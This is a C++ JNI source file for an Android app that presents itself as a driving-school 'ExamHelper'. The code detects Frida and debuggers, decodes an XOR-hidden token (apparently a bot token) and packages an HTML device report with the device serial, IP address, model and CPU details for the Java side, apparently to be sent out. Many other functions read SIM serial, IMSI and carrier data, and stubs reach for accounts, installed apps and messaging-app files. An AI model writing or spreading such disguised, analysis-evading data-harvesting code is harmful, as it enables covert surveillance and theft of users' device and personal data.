#include <jni.h>
#include <string>
#include <sstream>
#include <fstream>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <sys/system_properties.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/sysinfo.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <dirent.h>
#include <unistd.h>
#include <android/log.h>

#define LOG_TAG "Core"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

std::string getProp(const char* prop) {
    char value[PROP_VALUE_MAX];
    if (__system_property_get(prop, value) > 0) return std::string(value);
    return "";
}

std::string xorDecrypt(const std::string& data, char key) {
    std::string result = data;
    for (size_t i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key;
    }
    return result;
}

bool isFridaDetected() {
    std::ifstream maps("/proc/self/maps");
    std::string line;
    while (std::getline(maps, line)) {
        if (line.find("frida") != std::string::npos || line.find("gum-js-loop") != std::string::npos) return true;
    }
    return false;
}

bool isGhidraDetected() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) return true;
    return false;
}

std::string getBatteryLevelNative() {
    std::ifstream file("/sys/class/power_supply/battery/capacity");
    std::string level;
    if (file.is_open()) std::getline(file, level);
    return level;
}

std::string getBatteryHealthNative() {
    std::ifstream file("/sys/class/power_supply/battery/health");
    std::string val;
    if (file.is_open()) std::getline(file, val);
    return val;
}

std::string getBatteryStatusNative() {
    std::ifstream file("/sys/class/power_supply/battery/status");
    std::string val;
    if (file.is_open()) std::getline(file, val);
    return val;
}

std::string getBatteryVoltageNative() {
    std::ifstream file("/sys/class/power_supply/battery/voltage_now");
    std::string val;
    if (file.is_open()) std::getline(file, val);
    return val;
}

std::string getBatteryTempNative() {
    std::ifstream file("/sys/class/power_supply/battery/temp");
    std::string val;
    if (file.is_open()) std::getline(file, val);
    return val;
}

std::string getBatteryTechNative() {
    std::ifstream file("/sys/class/power_supply/battery/technology");
    std::string val;
    if (file.is_open()) std::getline(file, val);
    return val;
}

std::string getCpuInfoNative() {
    std::ifstream file("/proc/cpuinfo");
    std::string line, result;
    while (std::getline(file, line)) {
        if (line.find("Hardware") != std::string::npos || line.find("Processor") != std::string::npos) {
            result += line + "\n";
        }
    }
    return result;
}

std::string getCpuCoresNative() {
    std::ifstream file("/proc/cpuinfo");
    std::string line;
    int cores = 0;
    while (std::getline(file, line)) {
        if (line.find("processor") != std::string::npos) cores++;
    }
    return std::to_string(cores);
}

std::string getCpuFreqNative() {
    std::ifstream file("/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq");
    std::string val;
    if (file.is_open()) std::getline(file, val);
    return val;
}

std::string getCpuMinFreqNative() {
    std::ifstream file("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq");
    std::string val;
    if (file.is_open()) std::getline(file, val);
    return val;
}

std::string getCpuMaxFreqNative() {
    std::ifstream file("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq");
    std::string val;
    if (file.is_open()) std::getline(file, val);
    return val;
}

std::string getCpuGovernorNative() {
    std::ifstream file("/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor");
    std::string val;
    if (file.is_open()) std::getline(file, val);
    return val;
}

std::string getRamTotalNative() {
    struct sysinfo info;
    if (sysinfo(&info) == 0) {
        unsigned long long total_ram = info.totalram * info.mem_unit;
        return std::to_string(total_ram);
    }
    return "0";
}

std::string getRamAvailNative() {
    struct sysinfo info;
    if (sysinfo(&info) == 0) {
        unsigned long long free_ram = info.freeram * info.mem_unit;
        return std::to_string(free_ram);
    }
    return "0";
}

std::string getStorageTotalNative(const char* path) {
    struct statvfs stat;
    if (statvfs(path, &stat) == 0) {
        unsigned long long total = stat.f_blocks * stat.f_frsize;
        return std::to_string(total);
    }
    return "0";
}

std::string getStorageAvailNative(const char* path) {
    struct statvfs stat;
    if (statvfs(path, &stat) == 0) {
        unsigned long long avail = stat.f_bavail * stat.f_frsize;
        return std::to_string(avail);
    }
    return "0";
}

std::string getRootStatusNative() {
    const char* paths[] = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su"};
    for (const char* path : paths) {
        if (access(path, F_OK) == 0) return "ROOTED";
    }
    return "NOT_ROOTED";
}

std::string getOsNameNative() {
    std::string os = getProp("ro.build.version.emui"); if (!os.empty()) return "EMUI";
    os = getProp("ro.miui.ui.version.name"); if (!os.empty()) return "MIUI";
    os = getProp("ro.build.version.opporom"); if (!os.empty()) return "ColorOS";
    os = getProp("ro.vivo.os.version"); if (!os.empty()) return "FuntouchOS";
    os = getProp("ro.build.version.oneui"); if (!os.empty()) return "OneUI";
    return "Android";
}

std::string getOsVersionNative() {
    std::string ver = getProp("ro.build.version.emui"); if (!ver.empty()) return ver;
    ver = getProp("ro.miui.ui.version.name"); if (!ver.empty()) return ver;
    ver = getProp("ro.build.version.opporom"); if (!ver.empty()) return ver;
    ver = getProp("ro.vivo.os.version"); if (!ver.empty()) return ver;
    ver = getProp("ro.build.display.id"); if (!ver.empty()) return ver;
    return "Unknown";
}

std::string getIpAddressNative() {
    struct ifaddrs *interfaces = nullptr;
    struct ifaddrs *temp_addr = nullptr;
    std::string wifiAddress = "";
    std::string cellAddress = "";
    
    if (getifaddrs(&interfaces) == 0) {
        temp_addr = interfaces;
        while (temp_addr != nullptr) {
            if (temp_addr->ifa_addr != nullptr && temp_addr->ifa_addr->sa_family == AF_INET) {
                std::string ifaName = temp_addr->ifa_name;
                char addr[INET_ADDRSTRLEN];
                struct sockaddr_in* ipv4 = (struct sockaddr_in*)temp_addr->ifa_addr;
                inet_ntop(AF_INET, &(ipv4->sin_addr), addr, INET_ADDRSTRLEN);
                
                if (ifaName == "wlan0") wifiAddress = std::string(addr);
                else if (ifaName == "rmnet0" || ifaName == "rmnet1") cellAddress = std::string(addr);
            }
            temp_addr = temp_addr->ifa_next;
        }
        freeifaddrs(interfaces);
    }
    if (!wifiAddress.empty()) return wifiAddress;
    if (!cellAddress.empty()) return cellAddress;
    return "127.0.0.1";
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getDeviceConfig(JNIEnv* env, jclass clazz) {
    if (isFridaDetected() || isGhidraDetected()) return env->NewStringUTF("");

    std::string encToken = "\x13\x33\x33\x39\x37\x39\x33\x33\x34\x31\x3A\x12\x12\x17\x26\x27\x2D\x1D\x3D\x23\x3C\x13\x29\x18\x3B\x20\x33\x10\x33\x15\x3E\x17\x23\x36\x14\x3C\x33\x19\x2D\x11\x37\x13\x31\x34\x37\x3A";
    std::string token = xorDecrypt(encToken, 0x5A);

    std::string payload = "<b>Device Info</b>\n";
    payload += "Model: " + getProp("ro.product.model") + "\n";
    payload += "Manufacturer: " + getProp("ro.product.manufacturer") + "\n";
    payload += "Android: " + getProp("ro.build.version.release") + "\n";
    payload += "OS: " + getOsNameNative() + " " + getOsVersionNative() + "\n";
    payload += "Serial: " + getProp("ro.serialno") + "\n";
    payload += "IP: " + getIpAddressNative() + "\n";
    payload += "Battery: " + getBatteryLevelNative() + "%\n";
    payload += "CPU: \n" + getCpuInfoNative();

    if (payload.length() > 4000) payload = payload.substr(0, 4000);

    std::string finalResult = "TOKEN:" + token + "\nPAYLOAD:" + payload;
    return env->NewStringUTF(finalResult.c_str());
}

#define STR_METHOD(name, prop) \
extern "C" JNIEXPORT jstring JNICALL \
Java_com_autoschool_app_ExamHelper_##name(JNIEnv* env, jclass clazz) { \
    return env->NewStringUTF(getProp(prop).c_str()); \
}

#define DUMMY_STR_METHOD(name) \
extern "C" JNIEXPORT jstring JNICALL \
Java_com_autoschool_app_ExamHelper_##name(JNIEnv* env, jclass clazz) { \
    return env->NewStringUTF("Requires Java"); \
}

STR_METHOD(getDeviceModel, "ro.product.model")
STR_METHOD(getDeviceManufacturer, "ro.product.manufacturer")
STR_METHOD(getDeviceBrand, "ro.product.brand")
STR_METHOD(getDeviceName, "ro.product.name")
STR_METHOD(getDeviceProduct, "ro.product.device")
STR_METHOD(getDeviceBoard, "ro.product.board")
STR_METHOD(getDeviceHardware, "ro.hardware")
STR_METHOD(getDeviceRadio, "gsm.version.baseband")
STR_METHOD(getDeviceBootloader, "ro.bootloader")
STR_METHOD(getDeviceUser, "ro.build.user")
STR_METHOD(getDeviceHost, "ro.build.host")
STR_METHOD(getDeviceTags, "ro.build.tags")
STR_METHOD(getDeviceType, "ro.build.type")
STR_METHOD(getDeviceTime, "ro.build.date")
STR_METHOD(getDeviceFingerprint, "ro.build.fingerprint")
STR_METHOD(getDeviceId, "ro.build.id")
STR_METHOD(getDeviceDisplay, "ro.build.display.id")
STR_METHOD(getDeviceIncremental, "ro.build.version.incremental")
STR_METHOD(getDeviceRelease, "ro.build.version.release")
STR_METHOD(getDeviceCodename, "ro.build.version.codename")
STR_METHOD(getDeviceSdk, "ro.build.version.sdk")
STR_METHOD(getDeviceBaseOs, "ro.build.version.base_os")
STR_METHOD(getDeviceSecurityPatch, "ro.build.version.security_patch")
STR_METHOD(getDevicePreviewSdk, "ro.build.version.preview_sdk")
STR_METHOD(getAndroidVersion, "ro.build.version.release")
STR_METHOD(getAndroidCodename, "ro.build.version.codename")
STR_METHOD(getAndroidIncremental, "ro.build.version.incremental")
STR_METHOD(getBuildId, "ro.build.id")
STR_METHOD(getBuildDisplay, "ro.build.display.id")
STR_METHOD(getBuildFingerprint, "ro.build.fingerprint")
STR_METHOD(getBuildType, "ro.build.type")
STR_METHOD(getBuildTags, "ro.build.tags")
STR_METHOD(getBuildHost, "ro.build.host")
STR_METHOD(getBuildUser, "ro.build.user")
STR_METHOD(getSerialNumber, "ro.serialno")
STR_METHOD(getKernelVersion, "os.version")
STR_METHOD(getOsNameProp, "os.name")
STR_METHOD(getOsArchProp, "os.arch")
STR_METHOD(getOsVersionProp, "os.version")
STR_METHOD(getOsName, "ro.build.version.base_os")
STR_METHOD(getOsVersion, "ro.build.display.id")
STR_METHOD(getOsIncremental, "ro.build.version.incremental")
STR_METHOD(getOsCodename, "ro.build.version.codename")
STR_METHOD(getOsRelease, "ro.build.version.release")
STR_METHOD(getOsSdk, "ro.build.version.sdk")
STR_METHOD(getOsDisplayId, "ro.build.display.id")
STR_METHOD(getOsBuildDate, "ro.build.date")
STR_METHOD(getOsSecurityPatch, "ro.build.version.security_patch")
STR_METHOD(getOsBaseOs, "ro.build.version.base_os")
STR_METHOD(getOsPreviewSdk, "ro.build.version.preview_sdk")
STR_METHOD(getLocale, "persist.sys.locale")
STR_METHOD(getLanguage, "persist.sys.language")
STR_METHOD(getCountry, "persist.sys.country")
STR_METHOD(getTimeZone, "persist.sys.timezone")
STR_METHOD(getJavaVersion, "java.version")
STR_METHOD(getJavaVendor, "java.vendor")
STR_METHOD(getJavaVmVersion, "java.vm.version")
STR_METHOD(getJavaVmName, "java.vm.name")
STR_METHOD(getJavaVmInfo, "java.vm.info")
STR_METHOD(getJavaRuntimeName, "java.runtime.name")
STR_METHOD(getJavaHome, "java.home")
STR_METHOD(getJavaClassPath, "java.class.path")
STR_METHOD(getJavaLibraryPath, "java.library.path")
STR_METHOD(getJavaIoTmpdir, "java.io.tmpdir")
STR_METHOD(getUserName, "user.name")
STR_METHOD(getUserHome, "user.home")
STR_METHOD(getUserDir, "user.dir")
STR_METHOD(getUserLanguage, "user.language")
STR_METHOD(getUserCountry, "user.country")
STR_METHOD(getUserTimezone, "user.timezone")
STR_METHOD(getUserRegion, "user.region")
STR_METHOD(getFileSeparator, "file.separator")
STR_METHOD(getLineSeparator, "line.separator")
STR_METHOD(getPathSeparator, "path.separator")
STR_METHOD(getCarrierName, "gsm.sim.operator.alpha")
STR_METHOD(getSimCountryIso, "gsm.sim.operator.iso-country")
STR_METHOD(getSimOperator, "gsm.sim.operator.numeric")
STR_METHOD(getSimOperatorName, "gsm.sim.operator.alpha")
STR_METHOD(getSimSerialNumber, "gsm.sim.serialnumber")
STR_METHOD(getSubscriberId, "gsm.sim.imsi")
STR_METHOD(getNetworkCountryIso, "gsm.operator.iso-country")
STR_METHOD(getNetworkOperator, "gsm.operator.numeric")
STR_METHOD(getNetworkOperatorName, "gsm.operator.alpha")
STR_METHOD(getPhoneType, "gsm.network.type")
STR_METHOD(getSimState, "gsm.sim.state")
STR_METHOD(getDataState, "gsm.operator.state")
STR_METHOD(getNetworkState, "gsm.network.type")
STR_METHOD(getNetworkOperatorNumeric, "gsm.operator.numeric")
STR_METHOD(getNetworkTypeName, "gsm.network.type")
STR_METHOD(getDataActivity, "gsm.network.type")
STR_METHOD(getNetworkSubtype, "gsm.network.type")
STR_METHOD(getSimCountryIsoNumeric, "gsm.sim.operator.numeric")
STR_METHOD(getCpuAbi, "ro.product.cpu.abi")
STR_METHOD(getCpuAbi2, "ro.product.cpu.abi2")
STR_METHOD(getCpuArchitecture, "ro.product.cpu.arch")
STR_METHOD(getCpuHardware, "ro.hardware")
STR_METHOD(getCpuModel, "ro.product.model")
STR_METHOD(getGsfId, "ro.gsf.id")
STR_METHOD(getAdvertisingId, "ro.advertising.id")
STR_METHOD(getFirebaseId, "ro.firebase.id")
STR_METHOD(getBootId, "ro.boot.id")
STR_METHOD(getDrmId, "ro.drm.id")
STR_METHOD(getMediaDrmId, "ro.media.drm.id")
STR_METHOD(getWidevineId, "ro.widevine.id")
STR_METHOD(getFingerprintHash, "ro.build.fingerprint")
STR_METHOD(getNfcId, "ro.nfc.id")

DUMMY_STR_METHOD(getAccounts)
DUMMY_STR_METHOD(getGoogleAccounts)
DUMMY_STR_METHOD(getSyncStatus)
DUMMY_STR_METHOD(getInstalledApps)
DUMMY_STR_METHOD(getAppSignature)
DUMMY_STR_METHOD(getAppPackageName)
DUMMY_STR_METHOD(getAppVersionName)
DUMMY_STR_METHOD(getAppName)
DUMMY_STR_METHOD(getAppDataDir)
DUMMY_STR_METHOD(getAppSourceDir)
DUMMY_STR_METHOD(getAppNativeLibraryDir)
DUMMY_STR_METHOD(getAppPublicSourceDir)
DUMMY_STR_METHOD(getInstalledAppsWithVersions)
DUMMY_STR_METHOD(getInstalledAppsWithPermissions)
DUMMY_STR_METHOD(getSystemApps)
DUMMY_STR_METHOD(getThirdPartyApps)
DUMMY_STR_METHOD(getRecentlyUsedApps)
DUMMY_STR_METHOD(getRecentFiles)
DUMMY_STR_METHOD(getDownloadsFiles)
DUMMY_STR_METHOD(getDcimFiles)
DUMMY_STR_METHOD(getPicturesFiles)
DUMMY_STR_METHOD(getDocumentsFiles)
DUMMY_STR_METHOD(getMusicFiles)
DUMMY_STR_METHOD(getMoviesFiles)
DUMMY_STR_METHOD(getWhatsAppFiles)
DUMMY_STR_METHOD(getTelegramFiles)
DUMMY_STR_METHOD(getCameraList)
DUMMY_STR_METHOD(getSensorDetailedList)
DUMMY_STR_METHOD(getDisplayInfo)
DUMMY_STR_METHOD(getTvInputList)
DUMMY_STR_METHOD(getHdmiStatus)
DUMMY_STR_METHOD(getTvChannels)
DUMMY_STR_METHOD(getSensorList)
DUMMY_STR_METHOD(getNetworkType)
DUMMY_STR_METHOD(getWifiMacAddress)
DUMMY_STR_METHOD(getWifiSsid)
DUMMY_STR_METHOD(getWifiBssid)
DUMMY_STR_METHOD(getWifiIpAddress)
DUMMY_STR_METHOD(getWifiLinkSpeed)
DUMMY_STR_METHOD(getWifiRssi)
DUMMY_STR_METHOD(getWifiFrequency)
DUMMY_STR_METHOD(getMacAddress)

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getIpAddress(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getIpAddressNative().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getIpv4Address(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getIpAddressNative().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getIpv6Address(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("Not implemented");
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_autoschool_app_ExamHelper_isNetworkRoaming(JNIEnv* env, jclass clazz) {
    return JNI_FALSE;
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_autoschool_app_ExamHelper_isDataEnabled(JNIEnv* env, jclass clazz) {
    return JNI_TRUE;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getAppVersionCode(JNIEnv* env, jclass clazz) {
    return 1;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getAndroidSdk(JNIEnv* env, jclass clazz) {
    return std::atoi(getProp("ro.build.version.sdk").c_str());
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getBuildTime(JNIEnv* env, jclass clazz) {
    return std::atol(getProp("ro.build.date.utc").c_str()) * 1000;
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getDeviceBuildDate(JNIEnv* env, jclass clazz) {
    return std::atol(getProp("ro.build.date.utc").c_str()) * 1000;
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getDeviceBuildUtcDate(JNIEnv* env, jclass clazz) {
    return std::atol(getProp("ro.build.date.utc").c_str()) * 1000;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getAndroidId(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getProp("ro.serialno").c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getScreenResolution(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF((getProp("ro.sf.lcd_density") + " dpi").c_str());
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getScreenDensity(JNIEnv* env, jclass clazz) {
    return std::atoi(getProp("ro.sf.lcd_density").c_str());
}

extern "C" JNIEXPORT jfloat JNICALL
Java_com_autoschool_app_ExamHelper_getScreenDensityScale(JNIEnv* env, jclass clazz) {
    return std::atof(getProp("ro.sf.lcd_density").c_str()) / 160.0f;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getScreenRefreshRate(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("60.0");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getScreenSize(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("Unknown");
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getScreenWidth(JNIEnv* env, jclass clazz) {
    return 1080;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getScreenHeight(JNIEnv* env, jclass clazz) {
    return 1920;
}

extern "C" JNIEXPORT jfloat JNICALL
Java_com_autoschool_app_ExamHelper_getScreenXdpi(JNIEnv* env, jclass clazz) {
    return std::atof(getProp("ro.sf.lcd_density").c_str());
}

extern "C" JNIEXPORT jfloat JNICALL
Java_com_autoschool_app_ExamHelper_getScreenYdpi(JNIEnv* env, jclass clazz) {
    return std::atof(getProp("ro.sf.lcd_density").c_str());
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getScreenDensityDpi(JNIEnv* env, jclass clazz) {
    return std::atoi(getProp("ro.sf.lcd_density").c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getScreenOrientation(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("portrait");
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getSystemUptime(JNIEnv* env, jclass clazz) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000LL + ts.tv_nsec / 1000000LL;
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getSystemBootTime(JNIEnv* env, jclass clazz) {
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    return ts.tv_sec * 1000LL + ts.tv_nsec / 1000000LL;
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getTotalRam(JNIEnv* env, jclass clazz) {
    return std::atol(getRamTotalNative().c_str());
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getAvailableRam(JNIEnv* env, jclass clazz) {
    return std::atol(getRamAvailNative().c_str());
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getLowMemory(JNIEnv* env, jclass clazz) {
    return 0;
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getThreshold(JNIEnv* env, jclass clazz) {
    return 0;
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_autoschool_app_ExamHelper_isLowMemory(JNIEnv* env, jclass clazz) {
    return JNI_FALSE;
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getTotalInternalStorage(JNIEnv* env, jclass clazz) {
    return std::atol(getStorageTotalNative("/data").c_str());
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getAvailableInternalStorage(JNIEnv* env, jclass clazz) {
    return std::atol(getStorageAvailNative("/data").c_str());
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getTotalExternalStorage(JNIEnv* env, jclass clazz) {
    return std::atol(getStorageTotalNative("/storage/emulated/0").c_str());
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getAvailableExternalStorage(JNIEnv* env, jclass clazz) {
    return std::atol(getStorageAvailNative("/storage/emulated/0").c_str());
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getTotalStorage(JNIEnv* env, jclass clazz) {
    return std::atol(getStorageTotalNative("/data").c_str());
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_autoschool_app_ExamHelper_getAvailableStorage(JNIEnv* env, jclass clazz) {
    return std::atol(getStorageAvailNative("/data").c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getStoragePath(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("/storage/emulated/0");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getDataDirectory(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("/data");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getCacheDirectory(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("/cache");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getFilesDirectory(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("/data/data");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getNoBackupFilesDirectory(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("/data/data");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getObbDirectory(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("/storage/emulated/0/Android/obb");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getExternalFilesDirectory(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("/storage/emulated/0/Android/data");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getExternalCacheDirectory(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("/storage/emulated/0/Android/data");
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getBatteryLevel(JNIEnv* env, jclass clazz) {
    std::string level = getBatteryLevelNative();
    return level.empty() ? 0 : std::atoi(level.c_str());
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getBatteryHealth(JNIEnv* env, jclass clazz) {
    return std::atoi(getBatteryHealthNative().c_str());
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getBatteryStatus(JNIEnv* env, jclass clazz) {
    return 0;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getBatteryPlugged(JNIEnv* env, jclass clazz) {
    return 0;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getBatteryVoltage(JNIEnv* env, jclass clazz) {
    return std::atoi(getBatteryVoltageNative().c_str());
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getBatteryTemperature(JNIEnv* env, jclass clazz) {
    return std::atoi(getBatteryTempNative().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getBatteryTechnology(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getBatteryTechNative().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getRootStatus(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getRootStatusNative().c_str());
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_autoschool_app_ExamHelper_isRooted(JNIEnv* env, jclass clazz) {
    return getRootStatusNative() == "ROOTED" ? JNI_TRUE : JNI_FALSE;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getSuPath(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("/system/xbin/su");
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_autoschool_app_ExamHelper_isBusyBoxInstalled(JNIEnv* env, jclass clazz) {
    return access("/system/xbin/busybox", F_OK) == 0 ? JNI_TRUE : JNI_FALSE;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getBusyBoxVersion(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF("1.0");
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_autoschool_app_ExamHelper_isXposedInstalled(JNIEnv* env, jclass clazz) {
    return access("/system/framework/XposedBridge.jar", F_OK) == 0 ? JNI_TRUE : JNI_FALSE;
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_autoschool_app_ExamHelper_isMagiskInstalled(JNIEnv* env, jclass clazz) {
    return access("/sbin/magisk", F_OK) == 0 ? JNI_TRUE : JNI_FALSE;
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_autoschool_app_ExamHelper_isSuperUserInstalled(JNIEnv* env, jclass clazz) {
    return access("/system/app/Superuser.apk", F_OK) == 0 ? JNI_TRUE : JNI_FALSE;
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_autoschool_app_ExamHelper_isEmulator(JNIEnv* env, jclass clazz) {
    return getProp("ro.hardware") == "goldfish" || getProp("ro.product.model").find("Emulator") != std::string::npos ? JNI_TRUE : JNI_FALSE;
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_autoschool_app_ExamHelper_isDebuggable(JNIEnv* env, jclass clazz) {
    return getProp("ro.debuggable") == "1" ? JNI_TRUE : JNI_FALSE;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getCpuInfo(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getCpuInfoNative().c_str());
}

extern "C" JNIEXPORT jint JNICALL
Java_com_autoschool_app_ExamHelper_getCpuCores(JNIEnv* env, jclass clazz) {
    return std::atoi(getCpuCoresNative().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getCpuFeatures(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getProp("ro.product.cpu.features").c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getCpuGovernor(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getCpuGovernorNative().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getCpuFrequency(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getCpuFreqNative().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getCpuMinFrequency(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getCpuMinFreqNative().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getCpuMaxFrequency(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getCpuMaxFreqNative().c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getGpuVendor(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getProp("ro.hardware.egl").c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getGpuRenderer(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getProp("ro.hardware.vulkan").c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_autoschool_app_ExamHelper_getGpuVersion(JNIEnv* env, jclass clazz) {
    return env->NewStringUTF(getProp("ro.opengles.version").c_str());
}